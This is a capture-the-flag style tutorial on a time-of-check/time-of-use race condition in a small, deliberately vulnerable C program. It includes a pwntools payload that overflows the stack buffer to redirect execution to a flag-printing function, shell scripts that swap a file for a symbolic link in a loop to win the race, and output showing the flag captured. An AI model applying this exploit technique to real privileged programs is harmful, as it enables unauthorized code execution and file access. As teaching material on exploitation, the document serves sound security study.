# Problems

## Constructed Example

### Source Code

The source code is as follows:

```c
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>
void showflag() { system("cat flag"); }
void vuln(char *file, char *buf) {
  int number;
  int index = 0;
  int fd = open(file, O_RDONLY);
  if (fd == -1) {
    perror("open file failed!!");
    return;
  }
  while (1) {
    number = read(fd, buf + index, 128);
    if (number <= 0) {
      break;
    }
    index += number;
  }
  buf[index + 1] = '\x00';
}
void check(char *file) {
  struct stat tmp;
  if (strcmp(file, "flag") == 0) {
    puts("file can not be flag!!");
    exit(0);
  }
  stat(file, &tmp);
  if (tmp.st_size > 255) {
    puts("file size is too large!!");
    exit(0);
  }
}
int main(int argc, char *argv[argc]) {
  char buf[256];
  if (argc == 2) {
    check(argv[1]);
    vuln(argv[1], buf);
  } else {
    puts("Usage ./prog <filename>");
  }
  return 0;
}
```

### Analysis

We can see that the basic flow of the program is as follows:

- Check whether the command-line argument passed is "flag"; if so, exit.
- Check whether the file size corresponding to the command-line argument is greater than 255; if so, exit directly.
- Read the file content corresponding to the command-line argument into buf, where buf has a size of 256.

It seems like we checked the file size, and the buf size can also accommodate the maximum size. However, there is a race condition issue here.

If we delete the corresponding file after the program has checked its size and create a symbolic link to another larger file, the program will read more content, which will cause a stack overflow.

### Basic Approach

So the basic approach is: we want to obtain the content of the corresponding `flag`. We just need to modify the return address of the `main` function through a stack overflow. By disassembling and debugging, we can obtain the address of `showflag` and construct the corresponding payload:

```python
➜  racetest cat payload.py 
from pwn import *
test = ELF('./test')
payload = 'a' * 0x100 + 'b' * 8 + p64(test.symbols['showflag'])
open('big', 'w').write(payload)
```

The two race condition scripts are:

```sh
➜  racetest cat exp.sh    
#!/bin/sh
for i in `seq 500`
do
    cp small fake
    sleep 0.000008
    rm fake
    ln -s big fake
    rm fake
done
➜  racetest cat run.sh 
#!/bin/sh
for i in `seq 1000`
do
    ./test fake
done
```

Here, exp is used to race within the corresponding window to delete the fake file and create a symbolic link. run is used to execute the program.

### Actual Results

```shell
➜  racetest (sh exp.sh &) && sh run.sh
[...]
file size is too large!!
open file failed!!: No such file or directory
open file failed!!: No such file or directory
open file failed!!: No such file or directory
open file failed!!: No such file or directory
file size is too large!!
open file failed!!: No such file or directory
open file failed!!: No such file or directory
flag{race_condition_succeed!}
[...]
```

The key to success lies in choosing the appropriate `sleep` time.

## References

- http://www.cnblogs.com/biyeymyhjob/archive/2012/07/20/2601655.html
- http://www.cnblogs.com/huxiao-tee/p/4660352.html
- https://github.com/dirtycow/dirtycow.github.io
